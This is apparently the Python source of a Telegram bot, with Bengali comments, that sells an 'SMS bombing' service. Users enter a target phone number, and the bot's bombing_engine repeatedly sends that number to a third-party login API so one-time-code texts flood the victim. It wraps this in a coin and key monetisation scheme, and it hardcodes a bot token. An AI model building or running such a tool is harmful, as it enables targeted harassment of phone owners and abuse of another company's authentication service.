import telebot
import requests
import json
import os
import time
import threading
import random
from telebot import types
from datetime import datetime

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842  # আপনার নতুন অ্যাডমিন আইডি
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডেটাবেস হ্যান্ডলার ---
def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_db(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

# লোড ডাটা
users = load_db('users.json')
keys = load_db('keys.json')

# --- ইউজার ম্যানেজমেন্ট ফাংশন ---
def register_user(user):
    uid = str(user.id)
    name = user.first_name if user.first_name else "Unknown"
    username = f"@{user.username}" if user.username else "N/A"
    
    if uid not in users:
        users[uid] = {
            "id": uid,
            "name": name,
            "username": username,
            "status": "Free User",
            "coins": 50,
            "sent": 0,
            "key_used": "None",
            "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        bot.send_message(LOG_CHANNEL, f"🆕 **New User Registered:**\n👤 Name: {name}\n🆔 ID: `{uid}`")
    else:
        # তথ্য আপডেট করা (যদি ইউজার নাম বা ইউজারনেম পরিবর্তন করে)
        users[uid]["name"] = name
        users[uid]["username"] = username
    
    save_db('users.json', users)
    return users[uid]

# --- ভেরিফিকেশন ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- কিবোর্ড মেনু ---
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start SMS", callback_data="bomb"),
        types.InlineKeyboardButton("👤 My Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Use Key", callback_data="recharge"),
        types.InlineKeyboardButton("📢 Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}")
    )
    return markup

# --- স্টার্ট কমান্ড ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    u_data = register_user(message.from_user)
    
    if not is_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
        markup.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
        bot.send_photo(message.chat.id, LOGO_URL, caption="⚠️ **Access Denied!**\nPlease join our channel to use this bot.", reply_markup=markup)
        return

    welcome_msg = (f"🔥 **Welcome, {u_data['name']}!**\n"
                  f"━━━━━━━━━━━━━━━━━━━━\n"
                  f"🆔 Your ID: `{u_data['id']}`\n"
                  f"💰 Balance: `{u_data['coins']}` Coins\n"
                  f"🚀 Total Sent: `{u_data['sent']}`\n"
                  f"🏆 Rank: `{u_data['status']}`\n"
                  f"━━━━━━━━━━━━━━━━━━━━\n"
                  f"Choose an option to continue:")
    bot.send_photo(message.chat.id, LOGO_URL, caption=welcome_msg, reply_markup=main_menu())

# --- কলব্যাক কুয়েরি ---
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    uid = str(call.from_user.id)
    u_data = register_user(call.from_user)

    if call.data == "verify":
        if is_joined(call.from_user.id):
            bot.answer_callback_query(call.id, "✅ Access Granted!")
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_cmd(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ Join first!", show_alert=True)

    elif call.data == "profile":
        profile_text = (f"👤 **Your Advanced Profile**\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"🆔 ID: `{uid}`\n"
                        f"👤 Name: `{u_data['name']}`\n"
                        f"📧 User: `{u_data['username']}`\n"
                        f"💰 Balance: `{u_data['coins']}`\n"
                        f"🚀 SMS Sent: `{u_data['sent']}`\n"
                        f"🔑 Last Key: `{u_data['key_used']}`\n"
                        f"🏆 Status: `{u_data['status']}`\n"
                        f"📅 Joined: `{u_data['joined_at']}`")
        bot.send_message(call.message.chat.id, profile_text)

    elif call.data == "bomb":
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number:**")
        bot.register_next_step_handler(msg, get_number)

    elif call.data == "recharge":
        msg = bot.send_message(call.message.chat.id, "🔑 **Paste your key here:**")
        bot.register_next_step_handler(msg, redeem_key)

    # --- অ্যাডমিন কলব্যাক ---
    elif call.data.startswith("adm_"):
        if int(uid) != ADMIN_ID: return
        if call.data == "adm_stats":
            total_u = len(users)
            total_sent = sum(u['sent'] for u in users.values())
            bot.send_message(call.message.chat.id, f"📊 **Bot Stats**\n\nUsers: {total_u}\nTotal SMS Sent: {total_sent}")

# --- এসএমএস লজিক ---
def get_number(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **Enter Amount (1-100):**")
        bot.register_next_step_handler(msg, lambda m: start_bombing(m, num))
    else: bot.send_message(message.chat.id, "❌ Invalid Number!")

def start_bombing(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        uid = str(message.from_user.id)
        u_data = users[uid]
        cost = amount * 2

        if u_data['status'] != 'Premium' and u_data['coins'] < cost:
            bot.send_message(message.chat.id, f"⚠️ Need {cost} coins!")
            return

        progress = bot.send_message(message.chat.id, "🚀 **Attack Initiated...**")
        threading.Thread(target=bombing_engine, args=(uid, num, amount, cost, progress)).start()
    except: bot.send_message(message.chat.id, "❌ Invalid Input!")

def bombing_engine(uid, num, amount, cost, p_msg):
    success = 0
    api = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    
    for i in range(1, amount + 1):
        try:
            r = requests.post(api, json={"number": "+88"+num}, timeout=5)
            if r.status_code == 200: success += 1
            if i % 10 == 0:
                bot.edit_message_text(f"🚀 **Bombing {num}...**\nProgress: `{i}/{amount}`", p_msg.chat.id, p_msg.message_id)
            time.sleep(0.4)
        except: pass

    # ডাটা আপডেট
    if users[uid]['status'] != 'Premium':
        users[uid]['coins'] -= cost
    users[uid]['sent'] += success
    save_db('users.json', users)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔄 Attack Again", callback_data="bomb"))
    bot.edit_message_text(f"✅ **Attack Summary**\n\n🎯 Target: `{num}`\n🚀 Sent: `{success}`\n💰 Cost: `{cost}` Coins", p_msg.chat.id, p_msg.message_id, reply_markup=markup)

# --- কি সিস্টেম ---
def redeem_key(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys:
        val = keys[key]
        if val == "lifetime":
            users[uid]['status'] = "Premium"
        else:
            users[uid]['coins'] += int(val)
        
        users[uid]['key_used'] = key
        del keys[key]
        save_db('keys.json', keys)
        save_db('users.json', users)
        bot.send_message(message.chat.id, "🎉 **Key Success!** Coins/Premium added.")
    else: bot.send_message(message.chat.id, "❌ Invalid Key!")

# --- অ্যাডমিন কমান্ডস ---
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📊 Stats", callback_data="adm_stats"))
    markup.add(types.InlineKeyboardButton("🔑 Gen Key", callback_data="adm_gen"))
    bot.send_message(message.chat.id, "👑 **Dark Unknown Admin Panel**", reply_markup=markup)

@bot.message_handler(commands=['gen'])
def gen_key(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        val = message.text.split()[1]
        new_key = "DU-" + os.urandom(3).hex().upper()
        keys[new_key] = val
        save_db('keys.json', keys)
        bot.reply_to(message, f"✅ **Generated:** `{new_key}`\nValue: `{val}`")
    except: bot.reply_to(message, "Usage: `/gen 500` or `/gen lifetime`")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id != ADMIN_ID: return
    msg_text = message.text.replace("/broadcast ", "")
    count = 0
    for user_id in users:
        try:
            bot.send_message(user_id, f"📢 **Announcement:**\n\n{msg_text}")
            count += 1
        except: pass
    bot.reply_to(message, f"✅ Sent to {count} users.")

# --- রান বোট ---
if __name__ == "__main__":
    print(f"Bot started by Admin ID: {ADMIN_ID}")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=30)
        except Exception as e:
            time.sleep(5)
